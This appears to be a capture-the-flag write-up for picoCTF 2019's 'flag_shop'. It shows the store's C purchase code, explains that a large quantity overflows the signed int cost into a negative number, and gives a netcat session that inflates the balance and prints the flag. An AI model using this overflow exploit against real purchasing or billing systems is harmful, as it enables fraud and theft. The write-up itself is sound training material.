# flag_shop
First get the source. I like to use `curl | bat`
```bash
curl https://2019shell1.picoctf.com/static/23b8f90691073c4466b11fe2bae8d6ae/store.c | bat -l c
```
The vulnrability is in here.
```cpp
if (auction_choice == 1)
{
    printf("These knockoff Flags cost 900 each, enter desired quantity\n");

    int number_flags = 0;
    fflush(stdin);
    scanf("%d", &number_flags);
    if (number_flags > 0)
    {
        int total_cost = 0;
        total_cost = 900 * number_flags;
        printf("\nThe final cost is: %d\n", total_cost);
        if (total_cost <= account_balance)
        {
            account_balance = account_balance - total_cost;
            printf("\nYour current balance after transaction: %d\n\n", account_balance);
        }
        else
        {
            printf("Not enough funds to complete purchase\n");
        }
    }
}
```
By making `number_flags`, `900 * number_flags` will underflow, so `total_cost` is negitive and we increase `account_balance`.

To calculate the number of flags we want to buy use `((1<<31)//900)*1.5` in python. The `(1<<31)` is the max for a `int` 
(32 bits minus one for sign). Divide by 900 as the flags cost 900 each. Times by 1.5 so we add 0.5 of the `int` range.
This gives 3579138. By buying 3579138 fake flags, we can get enough money to afford the real one.
```bash
$ nc 2019shell1.picoctf.com 29250
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3579138

The final cost is: -1073743096

Your current balance after transaction: 1073744196

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_783740a8}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
3
```
flag: `picoCTF{m0n3y_bag5_783740a8}`
